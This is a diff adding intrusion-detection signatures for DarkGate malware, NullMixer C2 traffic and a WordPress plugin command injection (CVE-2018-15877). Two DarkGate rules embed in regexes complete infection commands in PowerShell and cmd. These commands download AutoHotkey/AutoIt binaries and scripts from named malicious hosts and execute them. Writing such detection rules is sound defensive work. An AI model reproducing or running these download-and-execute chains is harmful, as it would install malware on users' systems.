@@ -1,0 +1,36 @@
+
+
+#Darkgate Infection Malware Rule:2023-2024
+alert tcp any any -> any any (msg:"Detected DarkGate Malware File execution Pattern"; \
+flow:established,from_server; http.connection;content:"close"; \
+http.response_body; pcre:"/\b\w+\.exe\b/i"; \
+classtype:trojan-activity;metadata:created_at_2023_05_10,deployment:Perimeter;sid:202405010; rev:1;)
+
+
+
+#Nullmixter traige Signature Rule:
+alert http any  any -> any any (msg: "NUllMixter Detected"; flow:established,to_server; \
+http.method;content:"GET"; http.uri; content:"addInstall.php?key";content: "&oname[]=";content:"&cnt=";content:!"Refer"; \
+classtype:command-and-control; sid:202405090; rev:1; metadata: affected_product Windows_XP_Vista, created_at_2023_02_06, deployment Perimeter, malware_family_nullmixter, signature severity Major;)
+
+
+# Wordpress Command Injection Rule:
+alert http any any -> any 80 (msg:"OS command Injection Using WordPress Plugin" ;\
+http.method; content: "POST"; http.uri; content: "plainview_activity_monitor&tab=activity_tools"; \
+http.content_type;content:"multipart/form-data";http.request_body;content:"/bin/";sid:20240508;rev:01;classtype: web-application-attack;reference: cve, CVE-2018-15877;)
+
+
+
+# Rule 1: Detect PowerShell-based DarkGate malware infection-2024
+alert http any any -> any any (msg:"Darkgate PowerShell Malware";\
+flow:established,from_server; content:"ni";\
+pcre:"/ni\s+'C\:\/rimz'\s+-Type\s+Directory\s+-Force\;cd\s+'C\:\/rimz'\;Invoke-WebRequest\s+-Uri\s+\"http\:\/\/badbutperfect\.com\/test2\"\s+-OutFile\s+'AutoHotkey\.exe'\;Invoke-WebRequest\s+-Uri\s+\"http\:\/\/badbutperfect\.com\/jvtobaqj\"\s+-OutFile\s+'script\.ahk'\;Invoke-WebRequest\s+-Uri\s+\"http\:\/\/badbutperfect\.com\/ozkpfzju\"\s+-OutFile\s+'test\.txt'\;\s+start\s+'AutoHotkey\.exe'\s+-a\s+'script\.ahk'\;attrib\s+\+h\s+'C\:\/rimz'/"; classtype:trojan-activity; sid:20240507; rev:1;)
+
+
+#Rule 2: Detect DarkGate Malware infection chain-2023
+alert http any any -> any any (msg:"DArkGate Malware Infection";\
+flow:established,from_server; content:"mkdir";\
+pcre:"/mkdir\s+c\:\\omxg\s+&\s+cd\s+\/d\s+c\:\\omxg\s+&\s+copy\s+c\:\\windows\\system32\\curl\.exe\s+omxg\.exe\s+&\s+omxg\s+-H\s+\"User-Agent\:\s+curl\"\s+-o\s+Autoit3\.exe\s+http\:\/\/getldrrgoodgame\.com\:2351\s+&\s+omxg\s+-o\s+ralmzl\.au3\s+http\:\/\/getldrrgoodgame\.com\:2351\/msiomxgnyqu\s+&\s+Autoit3\.exe\s+ralmzl\.au3/"; \
+classtype:trojan-activity; sid:8000659; rev:1;)
+
+
